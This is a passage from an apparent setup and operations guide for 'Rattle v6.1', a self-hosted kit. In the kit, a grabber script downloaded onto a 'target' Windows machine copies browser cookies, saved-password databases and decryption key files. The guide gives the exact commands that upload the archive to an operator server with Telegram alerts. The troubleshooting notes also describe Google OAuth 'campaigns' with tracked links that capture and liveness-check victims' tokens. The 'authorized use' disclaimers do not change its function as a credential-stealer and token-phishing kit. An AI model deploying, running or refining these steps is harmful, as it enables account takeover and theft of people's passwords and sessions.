pip installs, nothing else. Even if the browser is RUNNING and holding its
files locked, a special SQLite reading mode still gets the data.

## B1 — Prepare the server side (already done — just verify)

Nothing extra to install: the endpoints live in app.py, and the `grab`
database table is created automatically on first start.

- Your upload URL: `https://officialmonsterz.store/api/grab/upload`
- Your key: the `GRAB_UPLOAD_KEY` value you wrote down in Step A3.3.
  Forgot it? On the VPS: `grep GRAB_UPLOAD_KEY /root/rattle/config.py`

**CHECK that the endpoint is alive AND protected.** Open a terminal on YOUR
own computer and run ONE of these (we deliberately send a WRONG key):

Windows PowerShell:

    curl.exe -s -X POST "https://officialmonsterz.store/api/grab/upload" -H "X-Grab-Key: WRONG" -F "x=1"

Mac/Linux terminal:

    curl -s -X POST "https://officialmonsterz.store/api/grab/upload" -H "X-Grab-Key: WRONG" -F "x=1"

**EXPECTED OUTPUT:**

    W {"error":"bad or missing X-Grab-Key header"}
    (PowerShell prefixes the HTTP code letter, e.g. "W" for a 4xx error)

or simply:

    {"error":"bad or missing X-Grab-Key header"}

**PASS means:** the endpoint exists, HTTPS works, AND your key gate works —
we sent the wrong key on purpose and it was rejected. A wrong key being
refused is exactly what a correct setup looks like. If you get
`404 Not Found` or a blank page instead → the server is still running old
code → do `cd /root/rattle && git pull && docker compose up -d --build` on
the VPS and retry.

## B2 — Prepare the target Windows machine

1. Log in to Windows as the user whose browser data you want (it only works
   for THAT user's data — that's the whole security model).
2. Install Python 3 if not present:
   - Download from https://python.org/downloads → run the installer
   - **IMPORTANT: on the very first installer screen, tick the checkbox
     "Add python.exe to PATH"** before clicking Install Now.
3. CHECK installation: open Command Prompt (Windows key → type `cmd` →
   Enter) and run:

       python --version

   **EXPECTED:** `Python 3.12.x` (anything 3.8 or newer works).
   If it says "not recognized" → the PATH box wasn't ticked → re-run the
   installer → Modify → tick it → retry.
4. Get the grabber script (your server hands it out — no GitHub needed):

       curl -o rattle_grab.py https://officialmonsterz.store/grab/download

   **EXPECTED:** silent success, and a new file `rattle_grab.py` appears in
   the folder where you ran the command (check with `dir`).
   (curl is built into Windows 10/11. If it somehow isn't: in your own
   browser log in to the dashboard → Grabs → "How to collect" page, which
   offers a manual download of the same file. Copy it to the machine.)

## B3 — Dry run first (no upload — see exactly what it finds)

In that same Command Prompt window:

    python rattle_grab.py

**EXPECTED OUTPUT (example — your profile counts will differ; colors appear
on a real console):**

    ============================================================
      RATTLE Browser Data Grabber
      authorized use only - coded by t.me/officialmonsterz
    ============================================================
    [*] device label : DESKTOP-ABC123-will
    [*] browsers     : chrome, edge, brave, firefox
    [*] scanning chrome profiles ...
    [+] [chrome] Local State copied (copy)
    [+] [chrome/Default] Cookies copied (sqlite-backup, 512 cookies)
    [+] [chrome/Default] Login Data copied (copy)
    [!] [chrome/Profile_1] no Login Data
    [*] scanning edge profiles ...
    [!] edge: not installed on this machine
    [*] scanning brave profiles ...
    [+] [brave/Default] Cookies copied (copy, 43 cookies)
    [*] scanning firefox profiles ...
    [+] [firefox/xxxxxxxx.default-release] cookies.sqlite copied (copy)
    [+] [firefox/xxxxxxxx.default-release] key4.db copied (copy)
    [+] [firefox/xxxxxxxx.default-release] logins.json copied (copy)

    [+] archive saved : rattle_grab_20260101_120000.zip
    [+] files copied  : 8
    [+] cookies found : 555
    [+] archive size  : 2.41 MB
    DONE.

**How to read the symbols:** `[+]` = success · `[!]` = a warning (fine to
continue) · `[x]` = a failure (see Part C).

**About `(sqlite-backup)`:** it means Chrome was RUNNING at that moment and had
the Cookies file locked — the script switched to a special SQLite reading mode
and got the data anyway. That's a GOOD line, not an error.

The command you typed, with no extra words, ends with the zip in the folder
you ran it from. Nothing was uploaded yet — nothing left the machine.

## B4 — Real run with upload

    python rattle_grab.py --upload https://officialmonsterz.store/api/grab/upload --key PASTE-YOUR-GRABKEY --device test-laptop

Replace `PASTE-YOUR-GRABKEY` with the key you wrote down in A3.3 (no quotes
needed). The same dry-run output appears, plus at the end:

    [*] uploading to https://officialmonsterz.store/api/grab/upload ...
    [+] upload OK - server said: {"id": 1, "size": 2531008, "success": true}

**FAIL line examples:** `upload failed (HTTP 401)` = wrong key → Part C, T22.
`upload failed (HTTP 0): ...` = no internet/DNS problem → check connection,
retry.

## B5 — Verify on the server (three checks — do all three)
1. Log in to the dashboard → **Grabs** (top menu) → a new row shows:
   device `test-laptop`, browser badges `chrome` `firefox`, cookies 555,
   ~2 MB, your IP, timestamp. Click the ⬇ download icon → the zip saves to
   your computer.
2. 📱 Your phone gets the Telegram alert within seconds:

       📦 Rattle grab received
       Device: test-laptop
       Browsers: chrome,firefox
       Cookies: 555
       Size: 2.41 MB

3. Dashboard → **Audit Log** → a row `grab_received`.

## B6 — What's inside the zip (and what each file is)

Unzip it and you'll see this structure:

    rattle_grab_YYYYMMDD_HHMMSS.zip
    ├── manifest.json                      <- device, user, hostname, counts
    ├── chrome/
    │   ├── Local State                   <- holds the encryption key reference
    │   ├── Default/
    │   │   ├── Cookies.sqlite            <- the cookie database for that profile
    │   │   └── Login Data.sqlite         <- saved passwords (encrypted)
    │   └── Profile_1/Cookies.sqlite
    ├── brave/Default/Cookies.sqlite
    └── firefox/xxxx.default-release/
        ├── cookies.sqlite
        ├── key4.db                       <- Firefox password key material
        └── logins.json

Open `manifest.json` first — it's a plain-text summary of everything.

**Plain English about decryption:** these files were encrypted BY that
Windows user, ON that machine. They decrypt properly when processed in that
same user context (the standard Windows DPAPI approach) on that machine —
`Local State` and `key4.db` sit right next to them in the zip precisely
because they are the pieces decryption needs. This is the same technique
password managers and backup tools use to move your own data between machines
you own.

**To inspect the databases quickly** (names/domains only — values stay
encrypted by design): on the target machine (or any machine with Python):

    python -c "import sqlite3; c=sqlite3.connect('chrome/Default/Cookies.sqlite'); print('\n'.join(r[0]+' '+r[1] for r in c.execute('SELECT host_key, name FROM cookies LIMIT 20')))"
    python -c "import sqlite3; c=sqlite3.connect('firefox/xxxx.default-release/cookies.sqlite'); print('\n'.join(r[0]+' '+r[1] for r in c.execute('SELECT host, name FROM moz_cookies LIMIT 20')))"

**EXPECTED:** a list of website domains and cookie names.

## B7 — Useful options

    --browsers chrome,firefox          # only collect these browsers
    --out C:\Temp                      # folder where the zip is written
    --device office-pc-2               # friendly label shown on the Grabs page
    --key YOUR_KEY --upload URL        # direct upload (as in B4)

All options can be combined, e.g.:
`python rattle_grab.py --browsers chrome,firefox --device lab-pc --upload https://officialmonsterz.store/api/grab/upload --key YOURKEY`

---

# PART C — TROUBLESHOOTING (exact error → exact fix)

**T1 — `port is already allocated` during docker compose up**
Something else holds port 8000: `sudo lsof -i :8000` → stop the offender
(`sudo systemctl stop NAME`) → retry.

**T2 — `curl: (7) Failed to connect ... port 8000: Connection refused`**
Container isn't running: `docker compose ps` → Exited/Restarting → T11. If
Up → wait 10 s and retry (first boot creates the DB).

**T3 — SSL/certificate errors**
`sudo certbot certificates` → an empty list means DNS isn't live yet (A1) →
fix DNS, re-run the A6 script. New cert + browser complaint → wait 5 min,
reload.

**T4 — Telegram message never arrives**
1) You MUST send the bot `hello` first (A4.2). 2) Wrong token/chat id →
test with the A4.4 curl and read the JSON error. 3) Are the values actually
inside the container?
`docker compose exec rattle cat /app/config.py | grep TELEGRAM`.

**T5 — Tokens stuck on `unknown`**
Campaign client_id/client_secret wrong → Google rejects refreshes → fix the
campaign's credentials on the campaign page → Tokens → "Run liveness check
now".

**T6 — `database is locked` in logs**
>1 gunicorn worker was used. Always use the Dockerfile's command
(`gunicorn -w 1 --threads 4 ...`) — or just use Docker, which does.

**T7 — Random logouts**
SECRET_KEY changed between restarts. Confirm config.py has a fixed key AND
the compose volume `rattle-data:/app/instance` still exists (never remove it).

**T8 — Google: `redirect_uri_mismatch`**
Campaign Redirect URI ≠ Google Console entry. Both must be EXACTLY
`https://officialmonsterz.store/callback` — no trailing slash, https, no www.

**T9 — Google: "unverified app" during consent**
Expected in a lab. Add your Gmail as a Test User (A8.4) and/or click
Advanced → Go to Rattle Lab (unsafe). Restricted-scope consents expire after
7 days in Testing mode — re-click the link when a token dies.

**T9b — HARD block, no "Advanced" option**
The consenting account isn't a registered test user. Google Auth Platform →
**Audience** → **Test users** → + ADD USERS → `willsmith32702@gmail.com` →
Save → wait 5 min → generate a FRESH tracked link → open it in an
INCOGNITO window → compare the email character-by-character with the
test-users list (a misspelled/different account is the cause 95% of the time).

**T10 — `/health` returns `{"status":"degraded"}`**
DB problem: `docker compose logs rattle --tail 50`. Most common: the volume
was wiped → `docker compose up -d --build` recreates it.

**T11 — Container `Exited` / `Restarting` right after start**
Run `docker compose logs rattle --tail 50`, read the LAST traceback:

| Log contains | Cause | Fix |
|---|---|---|
| `ModuleNotFoundError: No module named 'flask_migrate'` | Flask-Migrate missing from requirements.txt | add `Flask-Migrate==4.0.7` to requirements.txt on GitHub → `git pull` → rebuild (pip step must NOT say CACHED) |
| `ModuleNotFoundError: No module named 'pyotp' / 'qrcode'` | old requirements.txt | commit the full requirements.txt, pull, rebuild |
| `ModuleNotFoundError: No module named 'config'` | config.py missing | recreate via the A3.3 block |
| `SyntaxError` in config.py | hand-typed quotes | recreate via the A3.3 block (never hand-type) |
| `ImportError: cannot import name ...` | app.py/models.py from mixed versions | commit BOTH from the same code review, rebuild |
| `sqlite3.OperationalError: no such table/column` | old DB from a previous version | lab only: `docker compose down -v && docker compose up -d --build` |
| `Address already in use` | process holds 8000 | T1 |

**T12 — `nginx: [emerg] unknown directive "http2"`**
Old script on the server used `http2 on;` (needs nginx 1.25+; Ubuntu 22.04
ships 1.18). If the repo's script is the fixed one, a plain `git pull` +
re-run fixes it. Emergency 30-second manual fix (cert already issued):

    cat > /etc/nginx/sites-available/rattle << 'EOF'
    server {
        listen 80;
        server_name officialmonsterz.store;
        return 301 https://$server_name$request_uri;
    }
    server {
        listen 443 ssl http2;
        server_name officialmonsterz.store;
        ssl_certificate /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/officialmonsterz.store/privkey.pem;
        location / {
            proxy_pass http://127.0.0.1:8000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
        location /static/ {
            alias /root/rattle/static/;
            expires 1y;
        }
        access_log /var/log/nginx/rattle_access.log;
        error_log /var/log/nginx/rattle_error.log;
    }
    EOF
    nginx -t && systemctl reload nginx

**T13 — `cp: cannot stat 'config.example.py'`**
File not committed to GitHub → commit it → `git pull`; or skip the `cp` and
use the A3.3 block (needs no template).

**T14 — Page loads but no styling / static 404 or 403**
Nginx can't read /root → `chmod 755 /root && chmod -R 755 /root/rattle/static`,
then hard-refresh (Ctrl+Shift+R).

**T15 — `FIRST RUN` grep empty but container runs**
Password prints only on the very first start of a fresh DB. With the A3.3
fixed password this can't lock you out. If it somehow does: lab only:
`docker compose down -v && docker compose up -d --build`.

**T16 — `401 ... missing required authentication credential` using $AT**
You never set the variable → paste A10A2 as ONE line, `echo $AT` to verify.
Or the token is >1 hour old → refresh first (A10B).

**T17 — `400 Invalid value at 'max_results' (TYPE_UINT32), ".../ID"`**
You glued a message ID onto the LIST URL. One message = different URL:
`.../users/me/messages/MESSAGE_ID?format=full` — no maxResults there.

**T18 — `base64: invalid input` or garbage decoding a body**
Gmail uses URL-safe base64. Always:
`echo "DATA" | tr '_-' '/+' | base64 --decode`.

**T19 — `openid: command not found`**
Scopes belong in the CAMPAIGN'S Scopes box in the web dashboard — never typed
into a terminal.

**T20 — `MISSING browser_grab.py` in the A3 check**
The client script was never committed to GitHub. On GitHub: Add file →
Create new file → `browser_grab.py` → paste the full script → Commit. On the
VPS: `cd /root/rattle && git pull` → re-run the A3.2 check.

**T21 — Client prints `[x] no browser data collected`**
No browser profiles with cookies exist on that machine (fresh Windows, brand
new browser, or Private-Mode-only usage). Open the browser, visit any site,
retry. Not a code error.

**T22 — `upload failed (HTTP 401)`**
Wrong `--key`. Get the real one on the VPS:
`grep GRAB_UPLOAD_KEY /root/rattle/config.py`. Also possible: you changed
the key after the last `docker compose up -d` — config.py is mounted into
the container, so restart it: `docker compose restart rattle`. Still failing?
Verify what's inside the container:
`docker compose exec rattle cat /app/config.py | grep GRAB`.

**T23 — `upload failed (HTTP 413)`**
The zip is over 256 MB (huge profiles). Raise `MAX_CONTENT_LENGTH` in app.py,
or split the collection with `--browsers firefox` etc.

**T24 — Grabs page empty though the client said `upload OK`**
Confirm it reached YOUR server: on the VPS run
`docker compose logs rattle | grep "GRAB RECEIVED"` — a line with the same
timestamp must exist. If not, you uploaded to a wrong/other URL. If yes,
reload the Grabs page; if still empty, check you're on the same domain
(https://officialmonsterz.store, not http, not www).

**T25 — Telegram grab alert missing but the Grabs row exists**
Same fixes as T4: token/chat id, and confirm the values inside the container
(`docker compose exec rattle cat /app/config.py | grep TELEGRAM`). Then
`docker compose restart rattle`.

**T26 — `[!] no Login Data` warning for a profile**
That profile has no saved passwords. Expected, safe to ignore — it is a `[!]`
(not `[x]`).

---

# 📈 STAGE 11 — DAILY OPERATIONS CHEAT SHEET

| Task | How |
|---|---|
| Live logs | `docker compose logs -f rattle` |
| Is it running? | `docker compose ps` → must say `Up` |
| App crashed? | `docker compose logs rattle --tail 50` → Part C |
| Update code from GitHub | `cd /root/rattle && git pull && docker compose up -d --build` |
| Health check | `https://officialmonsterz.store/health` |
| Backup DB | `docker run --rm -v rattle_rattle-data:/data -v /root:/backup alpine tar czf /backup/rattle-backup-$(date +%F).tar.gz -C /data .` |
| Full restart | `docker compose restart` |
| Cert status | `sudo certbot certificates` |
| Firewall status | `ufw status` |
| Telegram test | `curl -s "https://api.telegram.org/bot<TOKEN>/sendMessage" -d chat_id=<ID> -d text=test` |

---

# ✅ FINAL HARDENING CHECKLIST (tick every one)

- [ ] DNS: officialmonsterz.store → 37.10.71.163 (`ping` / `dig` passes)
- [ ] UFW active: only 22/80/443; port 8000 NOT open externally
- [ ] fail2ban active (`systemctl is-active fail2ban` → active)
- [ ] Docker installed via get.docker.com (NOT apt install docker)
- [ ] Pre-flight file check: every line OK, incl. browser_grab.py
- [ ] config.py created via the A3.3 block, git-ignored (PROTECTED - good)
- [ ] GRAB_UPLOAD_KEY generated and written down
- [ ] Telegram test message delivered (`"ok":true`)
- [ ] `docker compose ps` shows `Up` (not Restarting)
- [ ] `https://officialmonsterz.store/health` returns ok with padlock 🔒
- [ ] Admin password changed after first login
- [ ] MFA enabled AND tested (logout → login → code required)
- [ ] Audit log shows login_success / mfa_enabled / password_changed
- [ ] Google Cloud: APIs enabled, app in Testing, test user added
- [ ] Redirect URI in Console matches campaign EXACTLY
- [ ] Tracked-link test: click counted → token captured → Telegram pinged
- [ ] Liveness verified: `valid` badge AND `dead` badge both observed
- [ ] Wrong-key upload returns the 401 error (step B1)
- [ ] Grab dry-run listed the machine's profiles (step B3)
- [ ] Real grab uploaded → Grabs page row + Telegram + audit row (step B5)
- [ ] DB backup taken

Done. Rattle v6.1 is live, hardened, and fully operational at
https://officialmonsterz.store — for authorized security research in your own
lab, on infrastructure and machines you own or are explicitly permitted to
test.
